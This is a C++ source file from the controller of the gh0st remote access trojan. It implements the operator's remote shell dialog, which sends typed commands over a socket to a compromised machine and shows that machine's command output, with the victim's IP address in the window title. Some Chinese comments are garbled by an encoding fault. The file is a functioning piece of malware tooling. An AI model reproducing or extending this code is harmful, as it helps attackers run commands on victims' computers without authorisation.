// ShellDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include <iostream>
#include <atlbase.h>
#include <string>
#include "ShellDlg.h"

using   std::string;
using namespace std;
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CShellDlg dialog


CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CShellDlg::IDD, pParent), m_nReceiveLength(0)
{
	//{{AFX_DATA_INIT(CShellDlg)
	// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nCurSel = 0;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMDSHELL));
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CShellDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
	//{{AFX_MSG_MAP(CShellDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT, OnChangeEdit)
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CShellDlg message handlers

BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN)
	{
		// ����VK_ESCAPE��VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			CString str;

			m_edit.GetWindowText(str);
			str += "\r\n";
			CString tosend = str.GetBuffer(0) + m_nCurSel;
			//			MessageBox(tosend,NULL,NULL);
#ifdef UNICODE
			USES_CONVERSION;
			string ByteToSend = W2A(tosend);
#else
			string ByteToSend = tosend;
#endif
			//			MessageBoxA(NULL,ByteToSend.c_str(),NULL,NULL);
			//			WideCharToMultiByte(CP_ACP, 0, tosend, -1,ByteToSend, sizeof(ByteToSend) / sizeof(ByteToSend[0]), NULL, FALSE);
			m_iocpServer->Send(m_pContext, (LPBYTE)ByteToSend.c_str(), ByteToSend.length());
			//			m_iocpServer->Send(m_pContext, (LPBYTE)str.GetBuffer(0) + m_nCurSel, str.GetLength() - m_nCurSel);
			m_nCurSel = m_edit.GetWindowTextLength();
		}
		// ����VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= m_nReceiveLength)
				return true;
		}
	}
	// Ctrlû����
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// �û�ɾ���˲������ݣ��ı�m_nCurSel
		if (len < m_nCurSel)
			m_nCurSel = len;
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}

BOOL CShellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_nCurSel = m_edit.GetWindowTextLength();

	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	CString m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format(_T("\\\\%s - Զ���ն�"), m_IPAddress);
	SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // ������󳤶�

	// ֪ͨԶ�̿��ƶ˶Ի����Ѿ���
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

void CShellDlg::OnReceiveComplete()
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}

void CShellDlg::AddKeyBoardData()
{
	// �������0
	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	strResult.Replace(_T("\n"), _T("\r\n"));
	int	 len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();
}


void CShellDlg::OnClose()
{
	//	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialogEx::OnClose();
	//	DestroyWindow();
}

void CShellDlg::ResizeEdit()
{
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;

	if (IsWindow(m_edit)) m_edit.MoveWindow(&rectEdit);
}

void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	ResizeEdit();
}

void CShellDlg::OnChangeEdit()
{
	// �û�ɾ���˲������ݣ��ı�m_nCurSel
	int len = m_edit.GetWindowTextLength();
	if (len < m_nCurSel)
		m_nCurSel = len;
}

HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //���ð�ɫ���ı�
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //���ú�ɫ�ı���
		return CreateSolidBrush(clr);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else
	{
		return CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}
